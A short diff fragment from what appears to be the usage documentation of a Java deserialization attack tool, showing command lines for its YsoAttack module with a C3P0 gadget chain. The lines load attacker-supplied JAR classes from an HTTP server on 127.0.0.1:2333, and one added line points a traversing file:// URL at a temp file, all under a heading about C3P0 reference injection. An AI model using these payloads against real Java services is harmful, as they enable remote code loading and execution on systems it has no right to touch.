@@ -753,7 +753,7 @@ lcation = "file:///../../../../../../../../../../../../tmp/T31147297087600.tmp";
 # c3p0:c3p0
 -m YsoAttack -g C3P02_c3p0 -a "http://127.0.0.1:2333/T32150077959500.jar|T32150077959500"
 -m YsoAttack -g C3P02_c3p0 -a "http://127.0.0.1:2333/EncryptionUtil.jar|ch.qos.logback.qd.EncryptionUtil"
--m YsoAttack -g C3P02_c3p0 -a ""
+-m YsoAttack -g C3P02_c3p0 -a "file:///../../../../../../../../../../../../T32448485776400.tmp|T32448485776400"
 ```
 
 #### C3P03 Reference注入
